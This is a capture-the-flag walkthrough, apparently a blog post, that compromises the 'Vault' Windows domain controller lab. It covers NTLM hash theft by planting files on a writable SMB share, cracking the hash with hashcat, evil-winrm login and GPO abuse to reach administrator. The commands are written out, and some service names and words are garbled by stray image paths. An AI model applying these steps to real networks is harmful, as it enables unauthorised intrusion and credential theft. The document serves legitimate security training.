---
title: Vault PGP Walkthrough
description: Target - Vault, OS - windows,  Difficulty - Hard
readTime: 12 min read
date: 01-15-2026
image: ../assets/images/vlt/vlt.png
---

---

#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -p- -T4 -Pn -n --min-rate=1000 --open -oN Vault-nmap 192.168.160.172

Nmap scan report for 192.168.160.172

Host is up (0.25s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-21 15:53:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  k/1dragon/assets/images/vlt/passwd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2025-01-20T15:47:35
|_Not valid after:  2025-07-22T15:47:35
|_ssl-date: 2025-01-21T15:55:21+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-01-21T15:54:29+00:00
5985/tcp  open  http          Microsoft HTT/1dragon/assets/images/vlt/PAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTT/1dragon/assets/images/vlt/PAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-21T15:54:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

smb share was accessed and listed  with  -N no /1dragon/assets/images/vlt/pass 

![](/1dragon/assets/images/vlt/Pasted%20image%2020260114235515.png)

---

#### ***Initial Access***
The Share `DocumentsShare` was writable which was confirmed by putting a file. This gives a potential lead. By placing file that connects to the local system and grab the hash of the user that executed the file from the share.

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115002029.png)
Hashgrab was used to generate several type of file which when executed by the target will connect to local.

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115001729.png)

After placing some of the hash grabbing file on the target share the NTLm hash was captured by responder.

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115014757.png)

The hash belongs to user anirudh.

![ntlm_hsh](/1dragon/assets/images/vlt/Pasted%20image%2020260115014540.png)

THe hash was cracked successfully using the hashcat.

```
hashcat ntlm-hash /usr/share/wordlists/rockyou.txt --force
```

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115015033.png)


Logged in as anirudh using evilwinrm.

```
evil-winrm -u 'anirudh' -p 'SecureHM' -i 192.168.160.172
```

successfully caputed the local flag at anirudh's desktop.

![local](/1dragon/assets/images/vlt/Pasted%20image%2020260115015917.png)

---

#### ***Privilege Escalation***

Transferred powerview.ps1 and executed  `Get-NetGPO` to find existing GPOs.

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115033941.png)

Discovered that user anirudh has the permission to modify the GPO

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115034108.png)

Using Shar/1dragon/assets/images/vlt/pAbuseGPO.exe added user anirudh as local admin.
Executed `gpupdate \force` to update the modification.

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115042551.png)

Confirmed that user anirudh was added to Administrators group.

```
net localgroup  Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
anirudh
The command completed successfully.
```

Used impacket-psexec with anirudh's credential logged in to the target as NT Authority.

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115043412.png)

Captured the administrator flag at administrator's desktop

![](/1dragon/assets/images/vlt/Pasted%20image%2020260115043430.png)


---
										Target compromised - |^| ^ ( |< 3 D